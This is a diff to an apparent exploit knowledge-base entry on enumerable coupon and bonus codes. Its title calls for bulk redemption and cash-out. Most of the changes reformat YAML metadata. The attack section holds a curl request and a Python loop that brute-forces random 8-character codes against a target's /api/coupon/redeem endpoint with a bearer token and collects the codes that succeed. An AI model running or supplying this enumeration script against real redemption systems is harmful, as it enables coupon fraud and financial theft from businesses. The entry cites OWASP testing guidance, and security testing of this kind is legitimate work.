@@ -1,22 +1,42 @@
 ﻿---
-title: Enumerable coupon / bonus codes (bulk redemption and cash-out)
-cve: None (business logic)
-severity: high
+id: "coupon-code-enumeration"
+title: "Enumerable coupon / bonus codes (bulk redemption and cash-out)"
+kind: "business-logic"
+cve: null
+related-cves: null
+cve-note: "None (business logic)"
+severity: "high"
 cvss: 8.3
-product: Custom promotion/redemption-code system
-versions: Any
-ports: 80, 443
-keywords: coupon codes, bonuses, redemption, enumeration, coupon, claiming
-entry: /api/coupon/redeem  /api/promo/exchange
+severity-basis: "cvss"
+severity-note: null
+product: "Custom promotion/redemption-code system"
+versions: "Any"
+ports: "80, 443"
+keywords: "coupon codes, bonuses, redemption, enumeration, coupon, claiming"
+entry: "/api/coupon/redeem /api/promo/exchange"
 verified: false
-sources: Compiled from public sources (business logic; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business logic; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
 POST /api/coupon/redeem {"code":"ABCD1234"}
-GET  /api/promo/list
+GET /api/promo/list
 ```
 
 ## Prerequisites
@@ -28,7 +48,7 @@ GET  /api/promo/list
 ```bash
 # 1) Try your own code first and confirm response differences (success/already used/nonexistent)
 curl -s -X POST https://target/api/coupon/redeem -H "Authorization: Bearer <t>" \
-  -H 'Content-Type: application/json' -d '{"code":"AAAA0001"}'
+ -H 'Content-Type: application/json' -d '{"code":"AAAA0001"}'
 
 # 2) Enumerate a small dictionary (rate-limit; start with 200 to demonstrate feasibility)
 python3 - <<'PY'
@@ -36,10 +56,10 @@ import requests, random, string
 t="https://target"; tk="<token>"
 ok=[]
 for _ in range(200):
-    code=''.join(random.choices(string.ascii_uppercase+string.digits, k=8))
-    r=requests.post(f"{t}/api/coupon/redeem", json={"code":code},
-                    headers={"Authorization":f"Bearer {tk}"}, timeout=5)
-    if r.status_code==200 and '"code":0' in r.text: ok.append((code, r.text[:80]))
+ code=''.join(random.choices(string.ascii_uppercase+string.digits, k=8))
+ r=requests.post(f"{t}/api/coupon/redeem", json={"code":code},
+ headers={"Authorization":f"Bearer {tk}"}, timeout=5)
+ if r.status_code==200 and '"code":0' in r.text: ok.append((code, r.text[:80]))
 print(len(ok), ok[:3])
 PY
 # Result: successful redemption = confirmed (concurrency would be faster)
@@ -59,4 +79,4 @@ PY
 
 ## References
 
-- OWASP WSTG-BUSL-04；CWE-799。
+- OWASP WSTG-BUSL-04; CWE-799.
